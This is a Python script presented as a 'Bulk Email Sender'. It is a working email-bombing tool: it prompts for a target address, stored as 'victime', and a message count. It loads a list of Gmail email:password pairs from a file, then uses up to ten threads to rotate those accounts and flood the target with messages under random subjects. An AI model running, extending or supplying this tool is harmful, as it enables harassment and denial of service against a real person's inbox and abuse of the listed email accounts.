# -*- coding: utf-8 -*-
import os
import smtplib
import sys
import re
from time import sleep
from concurrent.futures import ThreadPoolExecutor, as_completed

# Renk kodları (256 renk pastel tonları)
class Colors:
    INFO = '\033[38;5;159m'      # Pastel Açık Mavi
    SUCCESS = '\033[38;5;120m'   # Pastel Açık Yeşil
    ERROR = '\033[38;5;210m'     # Pastel Açık Kırmızı
    INPUT = '\033[38;5;229m'     # Pastel Açık Sarı
    RESET = '\033[0m'            # Reset

# Clear console (cross-platform)
os.system('cls' if os.name == 'nt' else 'clear')

# ASCII Banner
print(f"""
{Colors.INFO}

       #@@@@@@@@@@@@@@=
      @* @@@@@@@@@@@@ %@
      @@@ @@@@@@@@@@ @@@
      @@@@ @@@@@@@@ @@@@      Bulk Email Sender
      @@@@@ @@@@@@ @@@@@      Dev by @cyze{Colors.RESET}
      @@@@@. *@@-. @@@@@      https://github.com/root-cyze
      @@@@ @@#  @@@ @@@@
      @@@ @@@@@@@@@@ @@@
      @@ @@@@@@@@@@@@ @@
      @ @@@@@@@@@@@@@@ @
       @@@@@@@@@@@@@@@@

""")
print(" ")

# Validate email format
def is_valid_email(email):
    pattern = r'^[\w\.-]+@[\w\.-]+\.\w+$'
    return re.match(pattern, email) is not None

def clean_text(text):
    return ' '.join(text.strip().split())

# Get user inputs with validation
while True:
    victime = input(f'{Colors.INPUT}[INPUT]{Colors.RESET} Target E-Mail: ').strip()
    if is_valid_email(victime):
        break
    print(f"{Colors.ERROR}[ERROR]{Colors.RESET} Invalid email format. Try again.")

message = input(f'{Colors.INPUT}[INPUT]{Colors.RESET} Message to send: ').strip()

while True:
    try:
        hani = int(input(f'{Colors.INPUT}[INPUT]{Colors.RESET} Number of emails to send: '))
        if hani <= 0:
            raise ValueError
        break
    except ValueError:
        print(f"{Colors.ERROR}[ERROR]{Colors.RESET} Please enter a valid positive integer.")

# SMTP server info
SMTP_SERVER = 'smtp.gmail.com'
PORT = 587

def send_email(email, password, recipient, message, count):
    try:
        with smtplib.SMTP(SMTP_SERVER, PORT) as server:
            server.ehlo()
            server.starttls()
            server.ehlo()
            server.login(email, password)

            subject = os.urandom(9).hex()
            msg = f"From: {email}\r\nTo: {recipient}\r\nSubject: {subject}\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n{message}"

            server.sendmail(email, recipient, msg)

        print(f"{Colors.SUCCESS}[SUCCESS]{Colors.RESET} Email #{count + 1} sent successfully from {email}")
    except smtplib.SMTPAuthenticationError:
        print(f"{Colors.ERROR}[ERROR]{Colors.RESET} Authentication failed for {email}. Check username/password or app password.")
    except Exception as e:
        print(f"{Colors.ERROR}[ERROR]{Colors.RESET} Error sending email #{count + 1} from {email}: {e}")

def load_email_password_pairs(filepath='mail.txt'):
    pairs = []
    try:
        with open(filepath, 'r', encoding='utf-8') as file:
            for line_num, line in enumerate(file, 1):
                line = clean_text(line)
                if ':' not in line:
                    print(f"{Colors.ERROR}[ERROR]{Colors.RESET} Skipping invalid line {line_num} in '{filepath}': {line}")
                    continue
                email, password = line.split(':', 1)
                email = clean_text(email)
                password = clean_text(password)
                if not is_valid_email(email):
                    print(f"{Colors.ERROR}[ERROR]{Colors.RESET} Invalid email format in line {line_num}: {email}")
                    continue
                pairs.append((email, password))
    except FileNotFoundError:
        print(f"{Colors.ERROR}[ERROR]{Colors.RESET} File '{filepath}' not found.")
        sys.exit(1)

    if not pairs:
        print(f"{Colors.ERROR}[ERROR]{Colors.RESET} No valid email:password pairs found in '{filepath}'. Exiting.")
        sys.exit(1)

    return pairs

def main():
    print(f"{Colors.INFO}[INFO]{Colors.RESET} Loading email:password pairs...")
    email_password_pairs = load_email_password_pairs()
    print(f"{Colors.INFO}[INFO]{Colors.RESET} Loaded {len(email_password_pairs)} account(s). Starting to send emails...")

    def worker(i):
        email, password = email_password_pairs[i % len(email_password_pairs)]
        send_email(email, password, victime, message, i)
        sleep(0.5)

    max_threads = min(10, hani)

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(worker, i) for i in range(hani)]

        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"{Colors.ERROR}[ERROR]{Colors.RESET} Thread error: {e}")

    print(f"\n{Colors.SUCCESS}[SUCCESS]{Colors.RESET} All messages sent.")

if __name__ == "__main__":
    main()
